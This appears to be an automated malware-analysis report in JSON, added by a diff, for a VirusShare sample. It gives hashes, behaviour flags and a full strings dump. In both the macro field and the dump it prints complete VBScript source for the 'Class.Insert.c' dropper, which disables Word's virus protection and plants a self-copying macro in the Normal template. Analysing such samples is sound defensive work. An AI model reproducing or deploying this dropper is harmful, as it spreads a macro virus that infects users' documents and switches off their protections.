@@ -1,0 +1,91 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Chr": "May attempt to obfuscate specific str",
+            "CodeModule": "May attempt to modify the VBA code",
+            "CreateObject": "May create an OLE object",
+            "Document_Close": "Runs when the Word document is closed",
+            "VBComponents": "May attempt to modify the VBA code",
+            "VBProject": "May attempt to modify the VBA code"
+        },
+        "macro": "<html>\n\n<head>\n<meta http-equiv=\"Content-Type\"\ncontent=\"text/html; charset=iso-8859-1\">\n<meta name=\"GENERATOR\" content=\"Microsoft FrontPage Express 2.0\">\n<title></title>\n</head>\n\n<body>\n\n<p>&nbsp;</p>\n\n<p align=\"center\">The HTML version of VBS Class.Insert.c dropper</p>\n\n<p align=\"center\"><a\nhref=\"http://www.geocities.com/SiliconValley/Horizon/9386\">1nternal's\nVX Site</a></p>\n\n<p align=\"center\"><input type=\"button\" name=\"ButtonA\"\nvalue=\"1nstall Class.Insert.c\"></p>\n\n<p align=\"center\"><script language=\"VBScript\"><!--\nSub ButtonA_OnClick\n\nByeMsg_Text\t   = \"1nstalled!\"\nByeMsg_Title\t= \"Class.Insert.c\"\n\nDim objWord\nSet objWord = CreateObject(\"Word.Application\")\nSet NT = objWord.Templates(1).VBProject.VBComponents(1).CodeModule\n\nobjWord.Options.SaveNormalPrompt = False\nobjWord.Options.VirusProtection = False\n\nNT.InsertLines 1, \"Private Sub Document_Close()\"\nNT.InsertLines 2, \"'1nternal\"\nNT.InsertLines 3, \"On Error GoTo Break\"\nNT.InsertLines 4, \"Set A = ActiveDocument.VBProject.VBComponents(1).CodeModule\"\nNT.InsertLines 5, \"Set N = NormalTemplate.VBProject.VBComponents(1).CodeModule\"\nNT.InsertLines 6, \"Options.VirusProtection = False\"\nNT.InsertLines 7, \"Options.ConfirmConversions = False\"\nNT.InsertLines 8, \"Options.SaveNormalPrompt = False\"\nNT.InsertLines 9, \"If N.Lines(2, 1) = \" + Chr(34) + \"'1nternal\" + Chr(34) + \" Then GoTo CheckA\"\nNT.InsertLines 10, \"For I = 1 To 19\"\nNT.InsertLines 11, \"N.InsertLines I, A.Lines(I, 1)\"\nNT.InsertLines 12, \"Next I\"\nNT.InsertLines 13, \"CheckA:\"\nNT.InsertLines 14, \"If A.Lines(2, 1) = \" + Chr(34) + \"'1nternal\" + Chr(34) + \" Then GoTo Break\"\nNT.InsertLines 15, \"For I = 1 To 19\"\nNT.InsertLines 16, \"A.InsertLines I, N.Lines(I, 1)\"\nNT.InsertLines 17, \"Next I\"\nNT.InsertLines 18, \"Break:\"\nNT.InsertLines 19, \"End Sub\"\n\nSet NT = Nothing\nobjWord.application.quit\nDone = MsgBox (ByeMsg_Text,,ByeMsg_Title)\n\nEnd Sub\n--></script></p>\n</body>\n</html>"
+    },
+    "filename": "VirusShare_3d9d9d75d91f91d901ff27c514ca629c",
+    "filesize": 1956,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3d9d9d75d91f91d901ff27c514ca629c",
+        "sha1": "d928d237aa99d7fd3b63718fbe0c8958dbcd5947",
+        "sha256": "e8ca4cf1d15150e8e9fead7d3f7cadd8b93308f2124d835f7018f2e66a6fd8d0"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<html>",
+            "<head>",
+            "<meta http-equiv=\"Content-Type\"",
+            "content=\"text/html; charset=iso-8859-1\">",
+            "<meta name=\"GENERATOR\" content=\"Microsoft FrontPage Express 2.0\">",
+            "<title></title>",
+            "</head>",
+            "<body>",
+            "<p>&nbsp;</p>",
+            "<p align=\"center\">The HTML version of VBS Class.Insert.c dropper</p>",
+            "<p align=\"center\"><a",
+            "href=\"http://www.geocities.com/SiliconValley/Horizon/9386\">1nternal's",
+            "VX Site</a></p>",
+            "<p align=\"center\"><input type=\"button\" name=\"ButtonA\"",
+            "value=\"1nstall Class.Insert.c\"></p>",
+            "<p align=\"center\"><script language=\"VBScript\"><!--",
+            "Sub ButtonA_OnClick",
+            "ByeMsg_Text\t   = \"1nstalled!\"",
+            "ByeMsg_Title\t= \"Class.Insert.c\"",
+            "Dim objWord",
+            "Set objWord = CreateObject(\"Word.Application\")",
+            "Set NT = objWord.Templates(1).VBProject.VBComponents(1).CodeModule",
+            "objWord.Options.SaveNormalPrompt = False",
+            "objWord.Options.VirusProtection = False",
+            "NT.InsertLines 1, \"Private Sub Document_Close()\"",
+            "NT.InsertLines 2, \"'1nternal\"",
+            "NT.InsertLines 3, \"On Error GoTo Break\"",
+            "NT.InsertLines 4, \"Set A = ActiveDocument.VBProject.VBComponents(1).CodeModule\"",
+            "NT.InsertLines 5, \"Set N = NormalTemplate.VBProject.VBComponents(1).CodeModule\"",
+            "NT.InsertLines 6, \"Options.VirusProtection = False\"",
+            "NT.InsertLines 7, \"Options.ConfirmConversions = False\"",
+            "NT.InsertLines 8, \"Options.SaveNormalPrompt = False\"",
+            "NT.InsertLines 9, \"If N.Lines(2, 1) = \" + Chr(34) + \"'1nternal\" + Chr(34) + \" Then GoTo CheckA\"",
+            "NT.InsertLines 10, \"For I = 1 To 19\"",
+            "NT.InsertLines 11, \"N.InsertLines I, A.Lines(I, 1)\"",
+            "NT.InsertLines 12, \"Next I\"",
+            "NT.InsertLines 13, \"CheckA:\"",
+            "NT.InsertLines 14, \"If A.Lines(2, 1) = \" + Chr(34) + \"'1nternal\" + Chr(34) + \" Then GoTo Break\"",
+            "NT.InsertLines 15, \"For I = 1 To 19\"",
+            "NT.InsertLines 16, \"A.InsertLines I, N.Lines(I, 1)\"",
+            "NT.InsertLines 17, \"Next I\"",
+            "NT.InsertLines 18, \"Break:\"",
+            "NT.InsertLines 19, \"End Sub\"",
+            "Set NT = Nothing",
+            "objWord.application.quit",
+            "Done = MsgBox (ByeMsg_Text,,ByeMsg_Title)",
+            "End Sub",
+            "--></script></p>",
+            "</body>",
+            "</html>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.geocities.com/SiliconValley/Horizon/9386"
+        ]
+    },
+    "time": "0:00:00.291363",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
